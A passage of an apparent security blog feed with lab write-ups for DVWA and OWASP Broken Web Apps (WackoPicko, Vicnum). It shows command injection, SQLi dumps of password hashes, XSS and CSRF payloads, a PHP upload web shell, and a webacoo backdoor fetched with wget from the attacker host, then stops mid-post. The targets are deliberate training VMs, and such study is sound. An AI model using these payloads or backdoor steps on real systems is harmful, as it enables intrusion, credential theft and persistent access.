&lt;p&gt;Low:&lt;&#x2F;p&gt;
&lt;p&gt;Running burp intruder with admin as pass and default password wordlist as a payload&lt;&#x2F;p&gt;
&lt;p&gt;Medium:&lt;&#x2F;p&gt;
&lt;p&gt;High:&lt;&#x2F;p&gt;
&lt;p&gt;Running burp intruder and grepping for csrf tokens and default password list as a payload, pitch fork for targeting&lt;&#x2F;p&gt;
&lt;h1 id=&quot;command-injection&quot;&gt;Command Injection&lt;&#x2F;h1&gt;
&lt;p&gt;Low:&lt;&#x2F;p&gt;
&lt;p&gt;Right off the bat, passing: ; cat &#x2F;etc&#x2F;passwd&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash
daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin
bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin
sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin
sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync
games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin
man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin
lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin
mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin
news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin
uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin
proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin
www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin
backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin
list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin
irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin
nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin
systemd-timesync:x:100:103:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;bin&#x2F;false
systemd-network:x:101:104:systemd Network Management,,,:&#x2F;run&#x2F;systemd&#x2F;netif:&#x2F;bin&#x2F;false
systemd-resolve:x:102:105:systemd Resolver,,,:&#x2F;run&#x2F;systemd&#x2F;resolve:&#x2F;bin&#x2F;false
systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:&#x2F;run&#x2F;systemd:&#x2F;bin&#x2F;false
mysql:x:104:107:MySQL Server,,,:&#x2F;nonexistent:&#x2F;bin&#x2F;false
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Medium:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;| cat &#x2F;etc&#x2F;passwd

root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash
daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin
bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin
sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin
sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync
games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin
man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin
lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin
mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin
news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin
uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin
proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin
www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin
backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin
list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin
irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin
nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin
systemd-timesync:x:100:103:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;bin&#x2F;false
systemd-network:x:101:104:systemd Network Management,,,:&#x2F;run&#x2F;systemd&#x2F;netif:&#x2F;bin&#x2F;false
systemd-resolve:x:102:105:systemd Resolver,,,:&#x2F;run&#x2F;systemd&#x2F;resolve:&#x2F;bin&#x2F;false
systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:&#x2F;run&#x2F;systemd:&#x2F;bin&#x2F;false
mysql:x:104:107:MySQL Server,,,:&#x2F;nonexistent:&#x2F;bin&#x2F;false
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;High:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;| cat &#x2F;etc&#x2F;passwd

root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash
daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin
bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin
sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin
sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync
games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin
man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin
lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin
mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin
news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin
uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin
proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin
www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin
backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin
list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin
irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin
nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin
systemd-timesync:x:100:103:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;bin&#x2F;false
systemd-network:x:101:104:systemd Network Management,,,:&#x2F;run&#x2F;systemd&#x2F;netif:&#x2F;bin&#x2F;false
systemd-resolve:x:102:105:systemd Resolver,,,:&#x2F;run&#x2F;systemd&#x2F;resolve:&#x2F;bin&#x2F;false
systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:&#x2F;run&#x2F;systemd:&#x2F;bin&#x2F;false
mysql:x:104:107:MySQL Server,,,:&#x2F;nonexistent:&#x2F;bin&#x2F;false
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h1 id=&quot;csrf&quot;&gt;CSRF&lt;&#x2F;h1&gt;
&lt;p&gt;Low: &lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;html&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt;&amp;lt;img src=&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;vulnerabilities&#x2F;csrf&#x2F;?password_new=password&amp;password_conf=password&quot; &#x2F;&amp;gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Medium:&lt;&#x2F;p&gt;
&lt;p&gt;High:&lt;&#x2F;p&gt;
&lt;h1 id=&quot;file-inclusion&quot;&gt;File Inclusion&lt;&#x2F;h1&gt;
&lt;p&gt;Low:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;http:&#x2F;&#x2F;127.0.0.1&#x2F;vulnerabilities&#x2F;fi&#x2F;?page=&#x2F;etc&#x2F;passwd
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Medium:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;http:&#x2F;&#x2F;127.0.0.1&#x2F;vulnerabilities&#x2F;fi&#x2F;?page=file:&#x2F;&#x2F;&#x2F;etc&#x2F;hosts
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;High:&lt;&#x2F;p&gt;
&lt;p&gt;Upload a file matching: file[0-9].php and hit it: http:&#x2F;&#x2F;127.0.0.1&#x2F;vulnerabilities&#x2F;fi&#x2F;?page=file4.php&lt;&#x2F;p&gt;
&lt;p&gt;#File Upload&lt;&#x2F;p&gt;
&lt;p&gt;Low:&lt;&#x2F;p&gt;
&lt;p&gt;Upload a php file&lt;&#x2F;p&gt;
&lt;p&gt;Medium:&lt;&#x2F;p&gt;
&lt;p&gt;Upload a php file and set its mime type to image&#x2F;jpeg&lt;&#x2F;p&gt;
&lt;p&gt;High:&lt;&#x2F;p&gt;
&lt;p&gt;#CAPTCHA&lt;&#x2F;p&gt;
&lt;p&gt;Didn&#x27;t seem to work at all out of the box&lt;&#x2F;p&gt;
&lt;p&gt;Low:&lt;&#x2F;p&gt;
&lt;p&gt;Medium:&lt;&#x2F;p&gt;
&lt;p&gt;High:&lt;&#x2F;p&gt;
&lt;h1 id=&quot;sqli&quot;&gt;SQLi&lt;&#x2F;h1&gt;
&lt;p&gt;Low:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;sql&quot; class=&quot;language-sql &quot;&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;1&#x27; or 1 = 1
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Medium:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;sql&quot; class=&quot;language-sql &quot;&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;id=3 or 1 = 1&amp;Submit=Submit intercepting with burp
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;High:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;sql&quot; class=&quot;language-sql &quot;&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;ID: 1&#x27; or 1 = 1 union select user,password from users  #
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;ID: 1&#x27; or 1 = 1 union select user,password from users  #&lt;&#x2F;p&gt;
&lt;p&gt;First name: admin
Surname: admin&lt;&#x2F;p&gt;
&lt;p&gt;ID: 1&#x27; or 1 = 1 union select user,password from users  #
First name: Gordon
Surname: Brown&lt;&#x2F;p&gt;
&lt;p&gt;ID: 1&#x27; or 1 = 1 union select user,password from users  #
First name: Hack
Surname: Me&lt;&#x2F;p&gt;
&lt;p&gt;ID: 1&#x27; or 1 = 1 union select user,password from users  #
First name: Pablo
Surname: Picasso&lt;&#x2F;p&gt;
&lt;p&gt;ID: 1&#x27; or 1 = 1 union select user,password from users  #
First name: Bob
Surname: Smith&lt;&#x2F;p&gt;
&lt;p&gt;ID: 1&#x27; or 1 = 1 union select user,password from users  #
First name: admin
Surname: 5f4dcc3b5aa765d61d8327deb882cf99&lt;&#x2F;p&gt;
&lt;p&gt;ID: 1&#x27; or 1 = 1 union select user,password from users  #
First name: gordonb
Surname: e99a18c428cb38d5f260853678922e03&lt;&#x2F;p&gt;
&lt;p&gt;ID: 1&#x27; or 1 = 1 union select user,password from users  #
First name: 1337
Surname: 8d3533d75ae2c3966d7e0d4fcc69216b&lt;&#x2F;p&gt;
&lt;p&gt;ID: 1&#x27; or 1 = 1 union select user,password from users  #
First name: pablo
Surname: 0d107d09f5bbe40cade3de5c71e9e9b7&lt;&#x2F;p&gt;
&lt;p&gt;ID: 1&#x27; or 1 = 1 union select user,password from users  #
First name: smithy
Surname: 5f4dcc3b5aa765d61d8327deb882cf99&lt;&#x2F;p&gt;
&lt;h1 id=&quot;sqli-blind&quot;&gt;SQLi Blind&lt;&#x2F;h1&gt;
&lt;p&gt;Low:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;sql&quot; class=&quot;language-sql &quot;&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;2&#x27; and &#x27;a&#x27; = &#x27;a
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Medium:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;sql&quot; class=&quot;language-sql &quot;&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;id=1 and 1 != 2 &amp;Submit=Submit in burp
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;High:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;sql&quot; class=&quot;language-sql &quot;&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;1&#x27; and &#x27;&#x27; = &#x27;
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h1 id=&quot;xss-reflected&quot;&gt;XSS Reflected&lt;&#x2F;h1&gt;
&lt;p&gt;Low:&lt;&#x2F;p&gt;
&lt;p&gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;&#x2F;script&amp;gt;&lt;&#x2F;p&gt;
&lt;p&gt;Medium:&lt;&#x2F;p&gt;
&lt;p&gt;&amp;lt;svg onload=&amp;quot;alert(1)&amp;quot;&amp;gt;&lt;&#x2F;p&gt;
&lt;p&gt;High:&lt;&#x2F;p&gt;
&lt;p&gt;&amp;lt;a href=&amp;quot;#&amp;quot; onmouseover=&amp;quot;alert(1)&amp;quot;&amp;gt;adf&amp;lt;&#x2F;a&amp;gt;&lt;&#x2F;p&gt;
&lt;h1 id=&quot;xss-stored&quot;&gt;XSS Stored&lt;&#x2F;h1&gt;
&lt;p&gt;Low:&lt;&#x2F;p&gt;
&lt;p&gt;Message: &lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;&#x2F;script&amp;gt;
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Medium:&lt;&#x2F;p&gt;
&lt;p&gt;Message: &lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;html&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&amp;lt;svg onload=&quot;alert(1)&quot;&amp;gt;
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;High:&lt;&#x2F;p&gt;
&lt;p&gt;Message: &lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;html&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&amp;lta href=&quot;#&quot; onmouseover=&quot;alert(1)&quot;&amp;gt;adf&amp;lt;&#x2F;a&amp;gt;
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>Cut - Awk</title>
		<published>2017-04-11T00:00:00+00:00</published>
		<updated>2017-04-11T00:00:00+00:00</updated>
		<link href="https://m4l1c3.github.io/cut-awk/" type="text/html"/>
		<id>https://m4l1c3.github.io/cut-awk/</id>
		<content type="html">&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;awk  &#x27;{print $NF}&#x27; hashes | awk &#x27;NF &gt; 0&#x27; | cut -d \* -f 2-
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>OWASP Broken Web Apps WackoPicko</title>
		<published>2017-04-10T00:00:00+00:00</published>
		<updated>2017-04-10T00:00:00+00:00</updated>
		<link href="https://m4l1c3.github.io/owasp-broken-web-apps-wackopicko/" type="text/html"/>
		<id>https://m4l1c3.github.io/owasp-broken-web-apps-wackopicko/</id>
		<content type="html">&lt;p&gt;Right off the bat, try hitting the search box with a simple XSS payload:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;search.php?query=&amp;lt;script&amp;gt;alert(1)&amp;lt;%2Fscript&amp;gt;&amp;x=24&amp;y=12
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;#&#x2F;guestbook.php&lt;&#x2F;p&gt;
&lt;p&gt;Placing this:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;html&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&amp;lt;script&amp;gt;confirm(1)&amp;lt;&#x2F;script&amp;gt;
&amp;lt;img src=x onerror=&#x27;confirm(2)&#x27; &#x2F;&amp;gt;
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;into a comment body yields stored XSS&lt;&#x2F;p&gt;
&lt;p&gt;Next I made an account and started uploading stuff, turns out php files are uploadable and executable:&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;Make the file&#x27;s name be: whatever.php&lt;&#x2F;li&gt;
&lt;li&gt;Make its extension: .jpg&lt;&#x2F;li&gt;
&lt;li&gt;Upload&lt;&#x2F;li&gt;
&lt;li&gt;Open the broken image on the page you&#x27;re redirected to and open its URL in a new tab, remove the 550 from the URL&lt;&#x2F;li&gt;
&lt;li&gt;?cmd=ls -latr&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>OWASP Broken Web Apps Vicnum - Jotto</title>
		<published>2017-04-08T00:00:00+00:00</published>
		<updated>2017-04-08T00:00:00+00:00</updated>
		<link href="https://m4l1c3.github.io/owasp-broken-web-apps-vicnum-jotto/" type="text/html"/>
		<id>https://m4l1c3.github.io/owasp-broken-web-apps-vicnum-jotto/</id>
		<content type="html">&lt;p&gt;I started off just playing the game to see what happens moving through the workflow.  After guessing the word in 43 tries I noticed that the count is being passed from the success page over to the scoreboard, much like its sibling application this ends up being something we can modify in transit.&lt;&#x2F;p&gt;
&lt;p&gt;The second time round I made a wordlist of the second word to guess once I figured out it had an r in it:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;cewl -w wordlist.txt -v -d 0 -m 5 http:&#x2F;&#x2F;www.wordbyletter.com&#x2F;words_starting_with.php?q=r
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Luckily it did end up starting with an r, that way I didn&#x27;t have to play the annoying game again just to modify my number of guesses.&lt;&#x2F;p&gt;
&lt;p&gt;After getting to the scoreboard page I noticed that the name get parameter is being injected into an HTML string on the page, try making this the name:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;&#x2F;script&amp;gt;
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;into the URL for the name GET parameter worked.&lt;&#x2F;p&gt;
&lt;p&gt;The name parameter also seems like it might be vulnerable to SQLi&lt;&#x2F;p&gt;
&lt;p&gt;Doing a quick:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;sql&quot; class=&quot;language-sql &quot;&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&#x27; or 1 = 1 #
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;shows query results for all users on the page, so we know its injectable.&lt;&#x2F;p&gt;
&lt;p&gt;Now to get something a little more juicy:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;sql&quot; class=&quot;language-sql &quot;&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;union all select load_file(&#x27;&#x2F;etc&#x2F;apache2&#x2F;apache2.conf&#x27;),2,3,4#
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;This will return the entire apache web config in its entirety.&lt;&#x2F;p&gt;
&lt;p&gt;I suppose just like its sibling lets break in:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;sql&quot; class=&quot;language-sql &quot;&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&#x27;  union all select user,password,3,4 from mysql.user#
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;As in the sibling application this page can be used to get root&#x27;s password: https:&#x2F;&#x2F;www.hashkiller.co.uk&#x2F; which found the root password in question: owaspbwa, this matches the readme when the VM boots up.&lt;&#x2F;p&gt;
&lt;p&gt;Next lets ssh to the VM:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;ssh root@ip
pw: owaspbwa
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Now for a persisted backdoor, webacoo worked for the last one, why not use it again.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;webacoo -g -o bd.php
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Next fire up SimpleHTTPServer in Parrot and change directory to the web root &#x2F;var&#x2F;www on the VM and run:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;wget http:&#x2F;&#x2F;iptoparrot:8000&#x2F;bd.php
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Then to test things out:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;webacoo -t -u http:&#x2F;&#x2F;ip&#x2F;bd.php
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>OWASP Broken Web Apps Vicnum - Guessnum</title>
		<published>2017-04-06T00:00:00+00:00</published>
		<updated>2017-04-06T00:00:00+00:00</updated>
		<link href="https://m4l1c3.github.io/owasp-broken-web-apps-vicnum-guessnum/" type="text/html"/>
		<id>https://m4l1c3.github.io/owasp-broken-web-apps-vicnum-guessnum/</id>
		<content type="html">&lt;p&gt;I started off just playing the game to see what happens moving through the workflow.  After guessing the number in 8 tries I noticed that the count is being passed from the success page over to the scoreboard, using repeater to repeat with different parameters it turns out you can make up your own score by updating the paramter &amp;amp;cnt.&lt;&#x2F;p&gt;
&lt;p&gt;After letting Burp spider the site I saw a union page: union1.html seems like a sql union challenge..&lt;&#x2F;p&gt;
&lt;p&gt;Looking at the page, the name parameter probably isn&#x27;t sql injectable, but probably XSS vulnerable.&lt;&#x2F;p&gt;
&lt;p&gt;Throwing:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;&#x2F;script&amp;gt;
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;into the URL for the unionguessname GET parameter worked.&lt;&#x2F;p&gt;
&lt;p&gt;Now for the SQLi stuff.&lt;&#x2F;p&gt;
&lt;p&gt;Doing a quick:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;sql&quot; class=&quot;language-sql &quot;&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&#x27; or 1 = 1 #
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;shows query results for all users on the page, so we know its injectable.&lt;&#x2F;p&gt;
&lt;p&gt;Now to get the db users and their passwords:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;sql&quot; class=&quot;language-sql &quot;&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&#x27;  union all select user,password,3,4 from mysql.user#
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Then with this I first tried crackstation.net, but wasn&#x27;t able to get all the passwords for root, then I did a little research and it looks like the hashes are SHA1, after some searching I found this site: https:&#x2F;&#x2F;www.hashkiller.co.uk&#x2F; which found the root password in question: owaspbwa, this matches the readme when the VM boots up.&lt;&#x2F;p&gt;
&lt;p&gt;Then just to see how to do it I grabbed the whole database through a web request in Burp:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;sql&quot; class=&quot;language-sql &quot;&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&#x27;  union all select table_schema, table_name,column_name,4 from information_schema.columns where table_schema != &#x27;mysql&#x27; and table_schema != &#x27;information_schema&#x27;#
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Next lets ssh to the VM:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;ssh root@ip
pw: owaspbwa
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Now to get a persisted backdoor.&lt;&#x2F;p&gt;
&lt;p&gt;I&#x27;ve been playing with parrot and it looks like it comes with a web backdoor named webacoo, after some researching, it looks pretty solid, now to set things up.&lt;&#x2F;p&gt;
&lt;p&gt;First the backdoor has to be generated:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;webacoo -g -o bd.php
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The -o option specifies to output to a file and the -g specifies to generate backdoor code, there is another option -f that allows control over what PHP function gets called to invoke the shell.&lt;&#x2F;p&gt;
&lt;p&gt;Next fire up SimpleHTTPServer in Parrot and change directory to the web root &#x2F;var&#x2F;www on the VM and run:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;wget http:&#x2F;&#x2F;iptoparrot:8000&#x2F;bd.php
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Then to test things out:&lt;&#x2F;p&gt;
